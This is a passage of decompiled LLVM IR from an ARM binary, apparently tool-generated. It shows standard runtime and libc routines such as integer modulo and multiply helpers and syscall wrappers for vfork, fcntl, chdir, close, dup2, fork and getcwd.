  %v0_12ba4 = call i32 @__aeabi_ldiv0()
  call void @__pseudo_branch(i32 %v0_12ba0)
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_12b98, { 1, 2, 0 }
  uselistorder i32 %v0_12b84, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_12b64, { 1, 0, 2 }
  uselistorder i32 %v7_12b5c, { 1, 0 }
  uselistorder i32 %v3_12b58, { 1, 0 }
  uselistorder i32 %v1_12b40.v6_12b40.v6_12b48.v6_12b50, { 1, 2, 7, 5, 6, 4, 0, 3 }
  uselistorder i32 %v4_12b4c, { 1, 0 }
  uselistorder i32 %v4_12b44, { 1, 0 }
  uselistorder i32 %v4_12b3c, { 1, 0 }
  uselistorder i32 %v6_12b5c, { 3, 0, 2, 1 }
  uselistorder i32 %v2_12b2c, { 1, 0 }
  uselistorder i32 %v1_12b20, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v4_12b0c, { 1, 0, 3, 2 }
  uselistorder i32 %v0_12b18.pr33100, { 1, 0, 2, 3 }
  uselistorder i32 %v1_12aec, { 4, 1, 5, 3, 0, 2, 6, 7 }
  uselistorder i32 %arg2, { 7, 8, 6, 5, 3, 4, 0, 2, 1 }
  uselistorder label %dec_label_pc_12b94, { 1, 0 }
  uselistorder label %bb88, { 1, 0 }
  uselistorder label %dec_label_pc_12b88, { 1, 0 }
  uselistorder label %bb86, { 1, 0 }
  uselistorder label %bb83, { 1, 0 }
  uselistorder label %bb81, { 1, 0 }
  uselistorder label %dec_label_pc_12b34, { 1, 0 }
  uselistorder label %bb77, { 1, 0 }
  uselistorder label %bb76, { 2, 0, 3, 4, 5, 1 }
  uselistorder label %.thread65, { 1, 0 }
}

define i32 @__modsi3(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v2_12bb0 = icmp eq i32 %arg2, 0
  br i1 %v2_12bb0, label %dec_label_pc_12c84, label %dec_label_pc_12bb8

dec_label_pc_12bb8:                               ; preds = %entry
  %v1_12bb0 = icmp slt i32 %arg2, 0
  br i1 %v1_12bb0, label %bb, label %bb79

bb:                                               ; preds = %dec_label_pc_12bb8
  %v2_12bb8 = sub i32 0, %arg2
  br label %bb79

bb79:                                             ; preds = %dec_label_pc_12bb8, %bb
  %v4_12bd0 = phi i32 [ %arg2, %dec_label_pc_12bb8 ], [ %v2_12bb8, %bb ]
  %v0_12bbc = load i32, i32* @r0, align 4
  %v1_12bbc = icmp slt i32 %v0_12bbc, 0
  br i1 %v1_12bbc, label %bb80, label %bb81

bb80:                                             ; preds = %bb79
  %v2_12bc0 = sub i32 0, %v0_12bbc
  br label %bb81

bb81:                                             ; preds = %bb79, %bb80
  %v1_12bc8 = phi i32 [ %v0_12bbc, %bb79 ], [ %v2_12bc0, %bb80 ]
  %v1_12bc4 = add i32 %v4_12bd0, -1
  %v7_12bc4 = icmp eq i32 %v4_12bd0, 1
  br i1 %v7_12bc4, label %.thread70, label %bb82

bb82:                                             ; preds = %bb81
  %v10_12bc8 = icmp eq i32 %v1_12bc8, %v4_12bd0
  br i1 %v10_12bc8, label %.thread70, label %bb83

.thread70:                                        ; preds = %bb81, %bb82
  br label %.thread72

bb83:                                             ; preds = %bb82
  %v4_12bc8 = icmp ult i32 %v1_12bc8, %v4_12bd0
  br i1 %v4_12bc8, label %.thread6, label %bb84

bb84:                                             ; preds = %bb83
  %v6_12bd0 = and i32 %v1_12bc4, %v4_12bd0
  %v8_12bd0 = icmp eq i32 %v6_12bd0, 0
  br i1 %v8_12bd0, label %.thread72, label %dec_label_pc_12be0.preheader

dec_label_pc_12be0.preheader:                     ; preds = %bb84
  %v2_12be0109 = icmp ugt i32 %v4_12bd0, 268435455
  br i1 %v2_12be0109, label %.thread1, label %bb85

.thread72:                                        ; preds = %bb84, %.thread70
  %v1_12bd464 = phi i32 [ %v1_12bc8, %bb84 ], [ 0, %.thread70 ]
  %v3_12bd4 = and i32 %v1_12bd464, %v1_12bc4
  br label %.thread6

.thread1:                                         ; preds = %.thread2.thread7, %dec_label_pc_12be0.preheader
  %v0_12bf4.pr35.lcssa = phi i32 [ %v4_12bd0, %dec_label_pc_12be0.preheader ], [ %v4_12be8, %.thread2.thread7 ]
  %storemerge.lcssa = phi i32 [ 0, %dec_label_pc_12be0.preheader ], [ %v2_12bec9, %.thread2.thread7 ]
  br label %dec_label_pc_12bf4thread-pre-split.loopexit

bb85:                                             ; preds = %dec_label_pc_12be0.preheader, %.thread2.thread7
  %storemerge111 = phi i32 [ %v2_12bec9, %.thread2.thread7 ], [ 0, %dec_label_pc_12be0.preheader ]
  %v0_12bf4.pr35110 = phi i32 [ %v4_12be8, %.thread2.thread7 ], [ %v4_12bd0, %dec_label_pc_12be0.preheader ]
  %v4_12be4 = icmp ult i32 %v0_12bf4.pr35110, %v1_12bc8
  br i1 %v4_12be4, label %bb86, label %dec_label_pc_12bf4thread-pre-split.loopexit.loopexit

bb86:                                             ; preds = %bb85
  %v2_12be8 = and i32 %v0_12bf4.pr35110, 268435456
  %v3_12be8 = icmp eq i32 %v2_12be8, 0
  %v4_12be8 = mul i32 %v0_12bf4.pr35110, 16
  br i1 %v3_12be8, label %.thread2.thread7, label %dec_label_pc_12bf4.loopexit

.thread2.thread7:                                 ; preds = %bb86
  %v2_12bec9 = add i32 %storemerge111, 4
  %v2_12be0 = icmp ugt i32 %v4_12be8, 268435455
  br i1 %v2_12be0, label %.thread1, label %bb85

dec_label_pc_12bf4thread-pre-split.loopexit.loopexit: ; preds = %bb85
  br label %dec_label_pc_12bf4thread-pre-split.loopexit

dec_label_pc_12bf4thread-pre-split.loopexit:      ; preds = %dec_label_pc_12bf4thread-pre-split.loopexit.loopexit, %.thread1
  %v0_12bf4.pr35108 = phi i32 [ %v0_12bf4.pr35.lcssa, %.thread1 ], [ %v0_12bf4.pr35110, %dec_label_pc_12bf4thread-pre-split.loopexit.loopexit ]
  %storemerge105 = phi i32 [ %storemerge.lcssa, %.thread1 ], [ %storemerge111, %dec_label_pc_12bf4thread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_12bf4thread-pre-split

dec_label_pc_12bf4thread-pre-split:               ; preds = %.thread4, %dec_label_pc_12bf4thread-pre-split.loopexit
  %v1_12c0041 = phi i32 [ %storemerge105, %dec_label_pc_12bf4thread-pre-split.loopexit ], [ %v2_12c00, %.thread4 ]
  %v2_12bf836 = phi i32 [ %v1_12bc8, %dec_label_pc_12bf4thread-pre-split.loopexit ], [ %v2_12bf8, %.thread4 ]
  %v0_12bf4.pr = phi i32 [ %v0_12bf4.pr35108, %dec_label_pc_12bf4thread-pre-split.loopexit ], [ %v3_12bfc, %.thread4 ]
  br label %dec_label_pc_12bf4

dec_label_pc_12bf4.loopexit:                      ; preds = %bb86
  br label %dec_label_pc_12bf4

dec_label_pc_12bf4:                               ; preds = %dec_label_pc_12bf4.loopexit, %dec_label_pc_12bf4thread-pre-split
  %v0_12c08.pr = phi i32 [ %v1_12c0041, %dec_label_pc_12bf4thread-pre-split ], [ %storemerge111, %dec_label_pc_12bf4.loopexit ]
  %v2_12bf8 = phi i32 [ %v2_12bf836, %dec_label_pc_12bf4thread-pre-split ], [ %v1_12bc8, %dec_label_pc_12bf4.loopexit ]
  %v1_12bfc = phi i32 [ %v0_12bf4.pr, %dec_label_pc_12bf4thread-pre-split ], [ %v4_12be8, %dec_label_pc_12bf4.loopexit ]
  %v2_12bf4 = icmp slt i32 %v1_12bfc, 0
  br i1 %v2_12bf4, label %dec_label_pc_12c08, label %bb87

bb87:                                             ; preds = %dec_label_pc_12bf4
  %v4_12bf8 = icmp ult i32 %v1_12bfc, %v2_12bf8
  br i1 %v4_12bf8, label %.thread4, label %dec_label_pc_12c08

.thread4:                                         ; preds = %bb87
  %v3_12bfc = mul i32 %v1_12bfc, 2
  %v2_12c00 = add i32 %v0_12c08.pr, 1
  br label %dec_label_pc_12bf4thread-pre-split

dec_label_pc_12c08:                               ; preds = %bb87, %dec_label_pc_12bf4
  %v2_12c08 = add i32 %v0_12c08.pr, -3
  %v5_12c0c = icmp slt i32 %v0_12c08.pr, 3
  br i1 %v5_12c0c, label %dec_label_pc_12c4c, label %dec_label_pc_12c10

dec_label_pc_12c10:                               ; preds = %dec_label_pc_12c08, %bb91
  %v6_12c38 = phi i32 [ %v0_12c40, %bb91 ], [ %v2_12c08, %dec_label_pc_12c08 ]
  %v1_12c14 = phi i32 [ %v1_12c1c.v6_12c1c.v6_12c24.v6_12c2c, %bb91 ], [ %v2_12bf8, %dec_label_pc_12c08 ]
  %v3_12c3410 = phi i32 [ %v3_12c34, %bb91 ], [ %v1_12bfc, %dec_label_pc_12c08 ]
  %v3_12c10 = icmp ult i32 %v1_12c14, %v3_12c3410
  %v3_12c14 = select i1 %v3_12c10, i32 0, i32 %v3_12c3410
  %v1_12c1c = sub i32 %v1_12c14, %v3_12c14
  %v4_12c18 = udiv i32 %v3_12c3410, 2
  %v6_12c18 = icmp ult i32 %v1_12c1c, %v4_12c18
  %v6_12c1c = select i1 %v6_12c18, i32 0, i32 %v4_12c18
  %v1_12c1c.v6_12c1c = sub i32 %v1_12c1c, %v6_12c1c
  %.demorgan = and i1 %v3_12c10, %v6_12c18
  %v4_12c20 = udiv i32 %v3_12c3410, 4
  %v6_12c20 = icmp ult i32 %v1_12c1c.v6_12c1c, %v4_12c20
  %v6_12c24 = select i1 %v6_12c20, i32 0, i32 %v4_12c20
  %v1_12c1c.v6_12c1c.v6_12c24 = sub i32 %v1_12c1c.v6_12c1c, %v6_12c24
  %.demorgan76 = and i1 %.demorgan, %v6_12c20
  %v4_12c28 = udiv i32 %v3_12c3410, 8
  %v6_12c28 = icmp ult i32 %v1_12c1c.v6_12c1c.v6_12c24, %v4_12c28
  %v6_12c2c = select i1 %v6_12c28, i32 0, i32 %v4_12c28
  %v1_12c1c.v6_12c1c.v6_12c24.v6_12c2c = sub i32 %v1_12c1c.v6_12c1c.v6_12c24, %v6_12c2c
  %.demorgan77 = and i1 %.demorgan76, %v6_12c28
  br i1 %.demorgan77, label %bb89, label %bb88

bb88:                                             ; preds = %dec_label_pc_12c10
  br label %bb89

bb89:                                             ; preds = %dec_label_pc_12c10, %bb88
  %v2_12c30 = add i32 %v1_12c1c.v6_12c1c.v6_12c24.v6_12c2c, -1
  %v4_12c30 = sub i32 0, %v1_12c1c.v6_12c1c.v6_12c24.v6_12c2c
  %v5_12c30 = and i32 %v1_12c1c.v6_12c1c.v6_12c24.v6_12c2c, %v4_12c30
  %v3_12c34 = udiv i32 %v3_12c3410, 16
  %v5_12c38 = icmp slt i32 %v1_12c1c.v6_12c1c.v6_12c24.v6_12c2c, 1
  br i1 %v5_12c38, label %bb91, label %bb90

bb90:                                             ; preds = %bb89
  %v7_12c38 = add i32 %v6_12c38, -4
  %v9_12c38 = sub i32 3, %v6_12c38
  %v10_12c38 = and i32 %v9_12c38, %v6_12c38
  br label %bb91

bb91:                                             ; preds = %bb89, %bb90
  %v0_12c40 = phi i32 [ %v6_12c38, %bb89 ], [ %v7_12c38, %bb90 ]
  %v0_12c3c13.in = phi i32 [ %v2_12c30, %bb89 ], [ %v7_12c38, %bb90 ]
  %v1_12c3c12.in = phi i32 [ %v5_12c30, %bb89 ], [ %v10_12c38, %bb90 ]
  %v1_12c3c12 = icmp slt i32 %v1_12c3c12.in, 0
  %v0_12c3c13 = icmp slt i32 %v0_12c3c13.in, 0
  %v2_12c3c = xor i1 %v0_12c3c13, %v1_12c3c12
  br i1 %v2_12c3c, label %dec_label_pc_12c40, label %dec_label_pc_12c10

dec_label_pc_12c40:                               ; preds = %bb91
  %v1_12c40 = urem i32 %v0_12c40, 4
  %v2_12c40 = icmp eq i32 %v1_12c40, 0
  br i1 %v2_12c40, label %.thread6, label %bb92

bb92:                                             ; preds = %dec_label_pc_12c40
  %v3_12c44 = icmp eq i32 %v1_12c1c.v6_12c1c.v6_12c24.v6_12c2c, 0
  br i1 %v3_12c44, label %.thread6, label %dec_label_pc_12c4c

dec_label_pc_12c4c:                               ; preds = %bb92, %dec_label_pc_12c08
  %v0_12c60 = phi i32 [ %v3_12c34, %bb92 ], [ %v1_12bfc, %dec_label_pc_12c08 ]
  %v1_12c5c = phi i32 [ %v1_12c1c.v6_12c1c.v6_12c24.v6_12c2c, %bb92 ], [ %v2_12bf8, %dec_label_pc_12c08 ]
  %v0_12c4c = phi i32 [ %v0_12c40, %bb92 ], [ %v2_12c08, %dec_label_pc_12c08 ]
  %v5_12c50 = icmp slt i32 %v0_12c4c, -2
  br i1 %v5_12c50, label %dec_label_pc_12c70, label %dec_label_pc_12c54

dec_label_pc_12c54:                               ; preds = %dec_label_pc_12c4c
  %v8_12c4c = icmp eq i32 %v0_12c4c, -2
  br i1 %v8_12c4c, label %dec_label_pc_12c64, label %dec_label_pc_12c58

dec_label_pc_12c58:                               ; preds = %dec_label_pc_12c54
  %v3_12c58 = icmp ult i32 %v1_12c5c, %v0_12c60
  br i1 %v3_12c58, label %bb94, label %bb93

bb93:                                             ; preds = %dec_label_pc_12c58
  %v2_12c58 = sub i32 %v1_12c5c, %v0_12c60
  br label %bb94

bb94:                                             ; preds = %dec_label_pc_12c58, %bb93
  %v0_12c6454 = phi i32 [ %v1_12c5c, %dec_label_pc_12c58 ], [ %v2_12c58, %bb93 ]
  %v3_12c60 = udiv i32 %v0_12c60, 2
  br label %dec_label_pc_12c64

dec_label_pc_12c64:                               ; preds = %dec_label_pc_12c54, %bb94
  %v0_12c6c = phi i32 [ %v0_12c60, %dec_label_pc_12c54 ], [ %v3_12c60, %bb94 ]
  %v1_12c68 = phi i32 [ %v1_12c5c, %dec_label_pc_12c54 ], [ %v0_12c6454, %bb94 ]
  %v3_12c64 = icmp ult i32 %v1_12c68, %v0_12c6c
  br i1 %v3_12c64, label %bb96, label %bb95

bb95:                                             ; preds = %dec_label_pc_12c64
  %v2_12c64 = sub i32 %v1_12c68, %v0_12c6c
  br label %bb96

bb96:                                             ; preds = %dec_label_pc_12c64, %bb95
  %v0_12c7057 = phi i32 [ %v1_12c68, %dec_label_pc_12c64 ], [ %v2_12c64, %bb95 ]
  %v3_12c6c = udiv i32 %v0_12c6c, 2
  br label %dec_label_pc_12c70

dec_label_pc_12c70:                               ; preds = %dec_label_pc_12c4c, %bb96
  %v2_12c74 = phi i32 [ %v0_12c60, %dec_label_pc_12c4c ], [ %v3_12c6c, %bb96 ]
  %v1_12c74 = phi i32 [ %v1_12c5c, %dec_label_pc_12c4c ], [ %v0_12c7057, %bb96 ]
  %v3_12c70 = icmp ult i32 %v1_12c74, %v2_12c74
  br i1 %v3_12c70, label %.thread6, label %bb97

bb97:                                             ; preds = %dec_label_pc_12c70
  %v2_12c70 = sub i32 %v1_12c74, %v2_12c74
  br label %.thread6

.thread6:                                         ; preds = %dec_label_pc_12c70, %bb83, %.thread72, %dec_label_pc_12c40, %bb92, %bb97
  %v1_12c7c = phi i32 [ %v1_12c1c.v6_12c1c.v6_12c24.v6_12c2c, %dec_label_pc_12c40 ], [ 0, %bb92 ], [ %v1_12c74, %dec_label_pc_12c70 ], [ %v2_12c70, %bb97 ], [ %v3_12bd4, %.thread72 ], [ %v1_12bc8, %bb83 ]
  br i1 %v1_12bbc, label %bb98, label %bb99

bb98:                                             ; preds = %.thread6
  %v2_12c7c = sub i32 0, %v1_12c7c
  br label %bb99

bb99:                                             ; preds = %.thread6, %bb98
  %v1_12c80 = phi i32 [ %v1_12c7c, %.thread6 ], [ %v2_12c7c, %bb98 ]
  ret i32 %v1_12c80

dec_label_pc_12c84:                               ; preds = %entry
  %v0_12c84 = load i32, i32* @lr, align 4
  %v0_12c88 = call i32 @__aeabi_ldiv0()
  call void @__pseudo_branch(i32 %v0_12c84)
  ret i32 0

; uselistorder directives
  uselistorder i32 %v0_12c60, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_12c40, { 1, 0, 2 }
  uselistorder i32 %v7_12c38, { 1, 0 }
  uselistorder i32 %v3_12c34, { 1, 0 }
  uselistorder i32 %v1_12c1c.v6_12c1c.v6_12c24.v6_12c2c, { 0, 1, 2, 7, 5, 6, 4, 3 }
  uselistorder i32 %v4_12c28, { 1, 0 }
  uselistorder i32 %v4_12c20, { 1, 0 }
  uselistorder i32 %v4_12c18, { 1, 0 }
  uselistorder i32 %v6_12c38, { 3, 0, 2, 1 }
  uselistorder i32 %v2_12c08, { 1, 0 }
  uselistorder i32 %v1_12bfc, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v2_12bf8, { 1, 0, 3, 2 }
  uselistorder i32 %v4_12be8, { 1, 0, 3, 2 }
  uselistorder i32 %v0_12bf4.pr35110, { 1, 0, 2, 3 }
  uselistorder i32 %v1_12bc8, { 0, 2, 3, 1, 4, 6, 5 }
  uselistorder i32 %v4_12bd0, { 1, 0, 2, 3, 5, 4, 6, 7 }
  uselistorder i32 %arg2, { 3, 2, 1, 0 }
  uselistorder label %bb99, { 1, 0 }
  uselistorder label %.thread6, { 5, 0, 4, 3, 2, 1 }
  uselistorder label %dec_label_pc_12c70, { 1, 0 }
  uselistorder label %bb96, { 1, 0 }
  uselistorder label %dec_label_pc_12c64, { 1, 0 }
  uselistorder label %bb94, { 1, 0 }
  uselistorder label %bb91, { 1, 0 }
  uselistorder label %bb89, { 1, 0 }
  uselistorder label %dec_label_pc_12c10, { 1, 0 }
  uselistorder label %bb85, { 1, 0 }
  uselistorder label %.thread70, { 1, 0 }
  uselistorder label %bb81, { 1, 0 }
  uselistorder label %bb79, { 1, 0 }
}

define i32 @__aeabi_ldiv0() local_unnamed_addr {
entry:
  %v1_12c94 = load i32, i32* @r0, align 4
  ret i32 %v1_12c94
}

define i32 @__muldi3(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v3_12ca4 = udiv i32 %arg1, 65536
  %v3_12ca8 = udiv i32 %arg3, 65536
  %tmp = mul i32 %v3_12ca4, -65536
  %v5_12cac = add i32 %tmp, -1
  %v6_12cac = and i32 %v5_12cac, %arg1
  %tmp10 = mul i32 %v3_12ca8, -65536
  %v5_12cb0 = add i32 %tmp10, -1
  %v6_12cb0 = and i32 %v5_12cb0, %arg3
  %v2_12cb4 = mul i32 %v6_12cb0, %v6_12cac
  %v2_12cb8 = mul i32 %v6_12cb0, %v3_12ca4
  %v2_12cbc = mul i32 %v6_12cac, %v3_12ca8
  %v2_12cc4 = add i32 %v2_12cb8, %v2_12cbc
  %v3_12cc4 = icmp ult i32 %v2_12cc4, %v2_12cb8
  br i1 %v3_12cc4, label %bb, label %bb9

bb:                                               ; preds = %entry
  br label %bb9

bb9:                                              ; preds = %entry, %bb
  %v4_12ccc = mul i32 %v2_12cc4, 65536
  %v5_12ccc = add i32 %v4_12ccc, %v2_12cb4
  ret i32 %v5_12ccc

; uselistorder directives
  uselistorder i32 %v2_12cb8, { 1, 0 }
  uselistorder i32 %v6_12cac, { 1, 0 }
  uselistorder i32 %v3_12ca8, { 1, 0 }
  uselistorder i32 %v3_12ca4, { 1, 0 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %bb9, { 1, 0 }
}

define i32 @function_12ce8(i32 %arg1) local_unnamed_addr {
dec_label_pc_12ce8:
  ret i32 %arg1
}

define i32 @__vfork() local_unnamed_addr {
entry:
  %v0_12cf0 = call i32 @vfork()
  store i32 %v0_12cf0, i32* @r0, align 4
  %v2_12cf4 = icmp ugt i32 %v0_12cf0, -4097
  br i1 %v2_12cf4, label %bb1, label %bb

bb:                                               ; preds = %dec_label_pc_12d08, %entry
  %merge = phi i32 [ %v0_12cf0, %entry ], [ %v0_12d08, %dec_label_pc_12d08 ]
  ret i32 %merge

bb1:                                              ; preds = %entry
  %v4_12d00 = icmp eq i32 %v0_12cf0, -38
  br i1 %v4_12d00, label %dec_label_pc_12d08, label %bb2

dec_label_pc_12d08:                               ; preds = %bb1
  %v0_12d08 = call i32 @fork()
  store i32 %v0_12d08, i32* @r0, align 4
  %v2_12d0c = icmp ugt i32 %v0_12d08, -4097
  br i1 %v2_12d0c, label %bb2, label %bb

bb2:                                              ; preds = %bb1, %dec_label_pc_12d08
  %v0_12d14 = call i32 @__syscall_error()
  ret i32 %v0_12d14

; uselistorder directives
  uselistorder i32 %v0_12d08, { 1, 2, 0 }
  uselistorder label %bb2, { 1, 0 }
}

define i32 @__libc_fcntl(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %v6_12d20 = load i32, i32* @r2, align 4
  %v1_12d30 = add i32 %arg2, -12
  store i32 %v6_12d20, i32* @r3, align 4
  %tmp = icmp ugt i32 %v1_12d30, 2
  br i1 %tmp, label %dec_label_pc_12d58, label %dec_label_pc_12d50

dec_label_pc_12d50:                               ; preds = %entry
  %v0_12d50 = call i32 @__GI_fcntl64()
  br label %dec_label_pc_12d84

dec_label_pc_12d58:                               ; preds = %entry
  %v2_12d60 = call i32 (i32, i32, ...) @fcntl(i32 %arg1, i32 %arg2)
  store i32 %v2_12d60, i32* %r4.global-to-local, align 4
  %tmp8 = icmp ult i32 %v2_12d60, -4095
  br i1 %tmp8, label %dec_label_pc_12d84, label %dec_label_pc_12d70

dec_label_pc_12d70:                               ; preds = %dec_label_pc_12d58
  %v0_12d70 = call i32 @__errno_location()
  %v0_12d74 = load i32, i32* %r4.global-to-local, align 4
  %v1_12d74 = sub i32 0, %v0_12d74
  %v2_12d78 = inttoptr i32 %v0_12d70 to i32*
  store i32 %v1_12d74, i32* %v2_12d78, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12d84

dec_label_pc_12d84:                               ; preds = %dec_label_pc_12d70, %dec_label_pc_12d58, %dec_label_pc_12d50
  %storemerge = phi i32 [ %v0_12d50, %dec_label_pc_12d50 ], [ %v2_12d60, %dec_label_pc_12d58 ], [ -1, %dec_label_pc_12d70 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v2_12d60, { 1, 0, 2 }
}

define i32 @__GI_fcntl64() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %v0_12db4 = load i32, i32* @r0, align 4
  store i32 %v0_12db4, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_12db4, -4095
  br i1 %tmp, label %dec_label_pc_12dd0, label %dec_label_pc_12dc0

dec_label_pc_12dc0:                               ; preds = %entry
  %v0_12dc0 = call i32 @__errno_location()
  %v0_12dc4 = load i32, i32* %r4.global-to-local, align 4
  %v1_12dc4 = sub i32 0, %v0_12dc4
  %v2_12dc8 = inttoptr i32 %v0_12dc0 to i32*
  store i32 %v1_12dc4, i32* %v2_12dc8, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12dd0

dec_label_pc_12dd0:                               ; preds = %entry, %dec_label_pc_12dc0
  %v0_12dd0 = phi i32 [ %v0_12db4, %entry ], [ -1, %dec_label_pc_12dc0 ]
  ret i32 %v0_12dd0

; uselistorder directives
  uselistorder i32 %v0_12db4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12dd0, { 1, 0 }
}

; Function Attrs: noreturn
define i32 @__GI__exit(i32 %arg1) local_unnamed_addr #0 {
entry:
  store i32 %arg1, i32* @r5, align 4
  call void @exit(i32 %arg1)
  unreachable
}

define i32 @chdir() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12e0c = load i32, i32* @r4, align 4
  store i32 %v3_12e0c, i32* %stack_var_-8, align 4
  %v0_12e10 = call i32 @chdir()
  store i32 %v0_12e10, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_12e10, -4095
  br i1 %tmp, label %dec_label_pc_12e30, label %dec_label_pc_12e20

dec_label_pc_12e20:                               ; preds = %entry
  %v0_12e20 = call i32 @__errno_location()
  %v0_12e24 = load i32, i32* %r4.global-to-local, align 4
  %v1_12e24 = sub i32 0, %v0_12e24
  %v2_12e28 = inttoptr i32 %v0_12e20 to i32*
  store i32 %v1_12e24, i32* %v2_12e28, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12e30

dec_label_pc_12e30:                               ; preds = %entry, %dec_label_pc_12e20
  %v0_12e30 = phi i32 [ %v0_12e10, %entry ], [ -1, %dec_label_pc_12e20 ]
  %v2_12e34 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_12e34, i32* @r4, align 4
  ret i32 %v0_12e30

; uselistorder directives
  uselistorder i32 %v0_12e10, { 1, 0, 2 }
  uselistorder i32 ()* @chdir, { 1, 0 }
  uselistorder label %dec_label_pc_12e30, { 1, 0 }
}

define i32 @__libc_close(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12e38 = load i32, i32* @r4, align 4
  store i32 %v3_12e38, i32* %stack_var_-8, align 4
  %v1_12e3c = call i32 @close(i32 %arg1)
  store i32 %v1_12e3c, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v1_12e3c, -4095
  br i1 %tmp, label %dec_label_pc_12e5c, label %dec_label_pc_12e4c

dec_label_pc_12e4c:                               ; preds = %entry
  %v0_12e4c = call i32 @__errno_location()
  %v0_12e50 = load i32, i32* %r4.global-to-local, align 4
  %v1_12e50 = sub i32 0, %v0_12e50
  %v2_12e54 = inttoptr i32 %v0_12e4c to i32*
  store i32 %v1_12e50, i32* %v2_12e54, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12e5c

dec_label_pc_12e5c:                               ; preds = %entry, %dec_label_pc_12e4c
  %v0_12e5c = phi i32 [ %v1_12e3c, %entry ], [ -1, %dec_label_pc_12e4c ]
  %v2_12e60 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_12e60, i32* @r4, align 4
  ret i32 %v0_12e5c

; uselistorder directives
  uselistorder i32 %v1_12e3c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12e5c, { 1, 0 }
}

define i32 @dup2() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12e64 = load i32, i32* @r4, align 4
  store i32 %v3_12e64, i32* %stack_var_-8, align 4
  %v0_12e68 = call i32 @dup2()
  store i32 %v0_12e68, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_12e68, -4095
  br i1 %tmp, label %dec_label_pc_12e88, label %dec_label_pc_12e78

dec_label_pc_12e78:                               ; preds = %entry
  %v0_12e78 = call i32 @__errno_location()
  %v0_12e7c = load i32, i32* %r4.global-to-local, align 4
  %v1_12e7c = sub i32 0, %v0_12e7c
  %v2_12e80 = inttoptr i32 %v0_12e78 to i32*
  store i32 %v1_12e7c, i32* %v2_12e80, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12e88

dec_label_pc_12e88:                               ; preds = %entry, %dec_label_pc_12e78
  %v0_12e88 = phi i32 [ %v0_12e68, %entry ], [ -1, %dec_label_pc_12e78 ]
  %v2_12e8c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_12e8c, i32* @r4, align 4
  ret i32 %v0_12e88

; uselistorder directives
  uselistorder i32 %v0_12e68, { 1, 0, 2 }
  uselistorder i32 ()* @dup2, { 2, 1, 0 }
  uselistorder label %dec_label_pc_12e88, { 1, 0 }
}

define i32 @__libc_fork() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12e90 = load i32, i32* @r4, align 4
  store i32 %v3_12e90, i32* %stack_var_-8, align 4
  %v0_12e94 = call i32 @fork()
  store i32 %v0_12e94, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_12e94, -4095
  br i1 %tmp, label %dec_label_pc_12eb4, label %dec_label_pc_12ea4

dec_label_pc_12ea4:                               ; preds = %entry
  %v0_12ea4 = call i32 @__errno_location()
  %v0_12ea8 = load i32, i32* %r4.global-to-local, align 4
  %v1_12ea8 = sub i32 0, %v0_12ea8
  %v2_12eac = inttoptr i32 %v0_12ea4 to i32*
  store i32 %v1_12ea8, i32* %v2_12eac, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12eb4

dec_label_pc_12eb4:                               ; preds = %entry, %dec_label_pc_12ea4
  %v0_12eb4 = phi i32 [ %v0_12e94, %entry ], [ -1, %dec_label_pc_12ea4 ]
  %v2_12eb8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_12eb8, i32* @r4, align 4
  ret i32 %v0_12eb4

; uselistorder directives
  uselistorder i32 %v0_12e94, { 1, 0, 2 }
  uselistorder i32 ()* @fork, { 1, 0 }
  uselistorder label %dec_label_pc_12eb4, { 1, 0 }
}

define i32 @getcwd(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %v3_12ebc = load i32, i32* @r4, align 4
  store i32 %v3_12ebc, i32* %stack_var_-20, align 4
  %v6_12ebc = load i32, i32* @r5, align 4
  %v9_12ebc = load i32, i32* @r6, align 4
  %v12_12ebc = load i32, i32* @r7, align 4
  store i32 %arg2, i32* @r7, align 4
  %v2_12ec0 = icmp eq i32 %arg2, 0
  store i32 %arg1, i32* @r5, align 4
  %v2_12ecc = icmp eq i32 %arg1, 0
  br i1 %v2_12ec0, label %dec_label_pc_12ecc, label %dec_label_pc_12efc

dec_label_pc_12ecc:                               ; preds = %entry
  br i1 %v2_12ecc, label %dec_label_pc_12ee8, label %dec_label_pc_12ed4

